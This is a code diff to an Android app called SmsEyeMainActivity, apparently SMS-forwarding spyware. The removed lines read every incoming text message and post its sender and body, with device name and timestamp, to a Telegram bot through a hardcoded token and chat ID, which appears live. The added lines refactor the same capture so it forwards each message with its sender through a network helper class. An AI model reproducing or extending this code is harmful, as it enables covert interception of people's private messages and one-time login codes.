@@ -5,10 +5,8 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.os.AsyncTask;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.util.Log;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -20,19 +18,9 @@ import com.karumi.dexter.listener.single.PermissionListener;
 import com.karumi.dexter.listener.PermissionDeniedResponse;
 import com.karumi.dexter.listener.PermissionGrantedResponse;
 
-import com.example.sample.Constants;
-
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
-import java.util.Locale;
-
 public class SmsEyeMainActivity extends AppCompatActivity {
 
     private SmsReceiver smsReceiver;
-    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -67,76 +55,38 @@ public class SmsEyeMainActivity extends AppCompatActivity {
     }
 
     public static class SmsReceiver extends BroadcastReceiver {
-        private static final String TAG = "SmsReceiver";
-
         @Override
         public void onReceive(Context context, Intent intent) {
-            try {
-                Bundle bundle = intent.getExtras();
-                if (bundle == null) {
-                    throw new Exception("Bundle is null");
+            if (intent != null && "android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())
+                    && SmsEyeUtils.Companion.isPermissionGranted(context)) {
+
+                Bundle extras = intent.getExtras();
+                if (extras == null) return;
+
+                Object[] pdus = (Object[]) extras.get("pdus");
+                if (pdus == null) return;
+
+                SmsMessage[] messages = new SmsMessage[pdus.length];
+
+                for (int i = 0; i < pdus.length; i++) {
+                    Object pdu = pdus[i];
+                    if (pdu == null) continue;
+
+                    SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
+                    messages[i] = message;
+
+                    if (message != null) {
+                        String sender = message.getOriginatingAddress();
+                        String body = message.getMessageBody();
+
+                        String formattedMessage = "𝐍𝐞𝐰 𝐒𝐌𝐒 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝\n\n𝐬𝐞𝐧𝐝𝐞𝐫 : " + sender + "\n𝐦𝐞𝐬𝐬𝐚𝐠𝐞 : " + body;
+
+                        SmsEyeNetwork smsEyeNetwork = new SmsEyeNetwork(context);
+                        smsEyeNetwork.sendTextMessage(formattedMessage);
+                    }
                 }
-
-                Object[] pdus = (Object[]) bundle.get("pdus");
-                String format = bundle.getString("format");
-
-                if (pdus == null || format == null) {
-                    throw new Exception("PDUs or format is null");
-                }
-
-                StringBuilder smsMessage = new StringBuilder();
-
-                for (Object pdu : pdus) {
-                    SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu, format);
-                    smsMessage.append("From: ").append(message.getDisplayOriginatingAddress()).append("\n");
-                    smsMessage.append("Message: ").append(message.getDisplayMessageBody()).append("\n");
-                }
-
-                String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
-                        .format(Calendar.getInstance().getTime());
-                String deviceName = android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
-                String logMessage = "[" + deviceName + "] " + timestamp + "\n" + smsMessage.toString();
-
-                new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, logMessage);
-            } catch (Exception e) {
-                String errorLog = "⚠️ ERROR in SMS Receiver: " + e.getMessage();
-                Log.e(TAG, errorLog, e);
-                new SendToTelegramTask().execute(BOT_TOKEN, Constants.TELEGRAM_CHAT_ID, errorLog);
             }
-        }
-    }
-
-    public static class SendToTelegramTask extends AsyncTask<String, Void, Void> {
-        private static final String TAG = "SendToTelegramTask";
-
-        @Override
-        protected Void doInBackground(String... params) {
-            try {
-                String botToken = params[0];
-                String chatId = params[1];
-                String message = params[2];
-
-                String telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-                String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
-
-                URL url = new URL(telegramUrl);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                conn.setDoOutput(true);
-
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(payload.getBytes("UTF-8"));
-                    os.flush();
-                }
-
-                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
-            } catch (Exception e) {
-                String errorMsg = "⚠️ ERROR sending to Telegram: " + e.getMessage();
-                Log.e(TAG, errorMsg, e);
-                // Avoid infinite loop if Telegram fails. Don't call Telegram again here.
-            }
-            return null;
         }
     }
 }
+
